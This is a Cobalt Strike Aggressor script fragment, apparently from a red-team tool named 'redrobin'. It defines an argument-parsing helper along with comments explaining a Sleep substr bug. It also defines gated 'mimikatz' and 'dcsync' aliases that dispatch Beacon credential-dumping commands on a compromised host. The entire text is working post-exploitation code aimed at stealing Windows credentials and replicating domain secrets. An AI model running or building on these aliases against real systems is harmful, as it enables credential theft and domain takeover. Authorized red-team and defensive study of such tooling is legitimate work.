# Tier 1A: direct Beacon commands. Each alias body extracts raw arg string
# via the redrobin_alias_args() helper. This avoids the $2-is-first-token
# trap (Aggressor docs: $2 = first whitespace-tokenized arg, NOT entire
# arg string) AND guards against the Sleep substr() modular-wrap bug that
# fired when the operator typed just the bare alias name with no args.
#
# Sleep function references use the symbol from BeaconTaskBridge bytecode
# (see docs/aggressor-alias-args.md for mapping table — verified Phase 1 spike).

# Extract raw arg string from $0 (full command line) given the alias name.
# Returns "" if the operator typed just the bare alias name (no space, no args).
#
# Why: Sleep's substr($str, $start) does modular wrap-around when $start
# exceeds strlen($str), so substr("mimikatz", 10) returns "imikatz" instead
# of "". The naive substr($0, strlen("<cmd> ")+1) pattern dispatched
# "imikatz" / "csync" / "exec" etc. as the args to the bare command —
# mimikatz then errored with 'ERROR mimikatz_doLocal ; "imikatz" command of
# "standard" module not found'. Discovered 2026-05-18 during T13 smoke.
sub redrobin_alias_args {
    local('$full $cmd $prefix_len');
    ($full, $cmd) = @_;
    $prefix_len = strlen($cmd) + 1;   # +1 for the space after the cmd name
    if (strlen($full) > $prefix_len) {
        return substr($full, $prefix_len + 1);   # +1 because Sleep substr is 1-indexed
    }
    return "";
}

alias mimikatz {
    if (redrobin_gate($1, "mimikatz", $0)) {
        &bmimikatz($1, redrobin_alias_args($0, "mimikatz"));
    }
}

alias dcsync {
    if (redrobin_gate($1, "dcsync", $0)) {
        local('$rest @parts');
        $rest = redrobin_alias_args($0, "dcsync");
        @parts = split(' ', $rest);
        if (size(@parts) >= 2) {
            &bdcsync($1, @parts[0], @parts[1]);
        } else if (size(@parts) >= 1 && @parts[0] ne "") {
            &bdcsync($1, @parts[0]);
        }
        # else: empty rest, don't dispatch — operator typed bare 'dcsync'
    }
}

